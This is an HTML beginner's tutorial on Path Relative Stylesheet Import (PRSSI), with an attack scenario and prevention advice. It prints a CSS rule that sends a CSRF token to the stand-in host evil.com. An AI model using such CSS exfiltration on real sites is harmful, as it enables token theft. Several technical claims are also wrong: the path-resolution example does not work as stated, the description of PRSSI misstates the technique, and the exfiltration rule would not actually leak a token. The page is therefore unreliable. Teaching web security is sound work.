<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>

  <h1>🎯 Path Relative Stylesheet Import (PRSSI) – A Stylish Way to Hack</h1>

  <h2>👶 For Beginners: What is a Stylesheet Import?</h2>
  <p>
    Web pages use CSS (Cascading Style Sheets) to define how things look. These stylesheets are either embedded in the page or imported from external .css files.
  </p>
  <p>
    💡 Think of CSS like a clothing stylist for a webpage – it tells the browser how to dress up the content.
  </p>
  <p>Developers often import styles like this:</p>
  <pre><code>&lt;link rel="stylesheet" href="/styles/theme.css"&gt;</code></pre>
  <p>But if the path to that file is relative and not securely handled, attackers can manipulate it!</p>

  <h2>🚨 What is Path Relative Stylesheet Import Vulnerability (PRSSI)?</h2>
  <p>PRSSI is a web security flaw where attackers trick the application into loading a malicious file as a CSS stylesheet, due to:</p>
  <ul>
    <li>Relative path misconfiguration</li>
    <li>URL manipulation</li>
    <li>Lack of file validation</li>
  </ul>
  <p>This can be abused to steal sensitive information, such as CSRF tokens, usernames, or even perform JavaScript execution in rare cases (depending on the browser).</p>

  <h2>⚠️ How Does It Work?</h2>
  <p>Many web frameworks auto-load stylesheets based on the current URL path, especially when paths are relative.</p>

  <h3>🔥 Attack Scenario</h3>
  <p>A web app uses a relative stylesheet:</p>
  <pre><code>&lt;link rel="stylesheet" href="assets/css/style.css"&gt;</code></pre>
  <p>An attacker tricks the browser into loading:</p>
  <pre><code>https://example.com/malicious/../../admin</code></pre>
  <p>The browser resolves the path and loads:</p>
  <pre><code>https://example.com/admin/assets/css/style.css</code></pre>
  <p>If the attacker controls the /admin/ path or a file named style.css, they can inject CSS that:</p>
  <ul>
    <li>Exfiltrates data using @import or url()</li>
    <li>Forces form auto-fill leaks</li>
    <li>Triggers Cross-Origin CSS (CoCSS) attacks</li>
  </ul>

  <h2>🧪 Realistic Exploitation</h2>
  <p>Example: CSS Data Exfiltration via background-image</p>
  <pre><code>input[name="csrf"] {
  background-image: url("https://evil.com/steal?token=VALUE");
}</code></pre>
  <p>The browser will load the background-image when the input field is rendered, and leak the CSRF token in the request.</p>

  <h2>💥 Why Is This Dangerous?</h2>
  <ul>
    <li>✅ Works even without JavaScript</li>
    <li>✅ Can bypass CSP if stylesheets are allowed</li>
    <li>✅ Exploitable with minimal user interaction</li>
    <li>✅ Can target internal pages like /admin or /settings</li>
  </ul>

  <h2>🛡️ How to Prevent PRSSI Vulnerabilities</h2>
  <ul>
    <li><strong>✔️ Use Absolute Paths</strong><br>Always use absolute paths for stylesheets and other assets:</li>
    <pre><code>&lt;link rel="stylesheet" href="/assets/css/style.css"&gt;</code></pre>
    <p>This ensures that the path doesn't change based on the current URL.</p>

    <li><strong>✔️ Validate and Restrict Paths</strong><br>Prevent attackers from controlling or guessing resource paths:</li>
    <ul>
      <li>Disable directory listing</li>
      <li>Avoid exposing internal directories</li>
      <li>Use route-based whitelisting</li>
    </ul>

    <li><strong>✔️ Set Correct MIME Types</strong><br>Ensure the server sends correct Content-Type headers:</li>
    <pre><code>Content-Type: text/css</code></pre>
    <p>⛔ Block serving HTML, JS, or other files as CSS.</p>

    <li><strong>✔️ Implement a Strict CSP</strong><br>Use a Content Security Policy to prevent loading styles from untrusted sources:</li>
    <pre><code>Content-Security-Policy: style-src 'self';</code></pre>

    <li><strong>✔️ Access Controls & Authentication</strong><br>Don’t rely on obscurity. Restrict access to sensitive areas like /admin/ with proper auth and access control.</li>
  </ul>

  <h2>🚀 Final Thoughts</h2>
  <p>Path Relative Stylesheet Import (PRSSI) may sound like just a design flaw, but it's a sneaky web attack vector that can lead to data leaks and user compromise—all via CSS!</p>
  <p>💡 If your app dynamically builds paths or uses relative styles, treat it like a security concern—not just a design choice.</p>

</body>
</html>
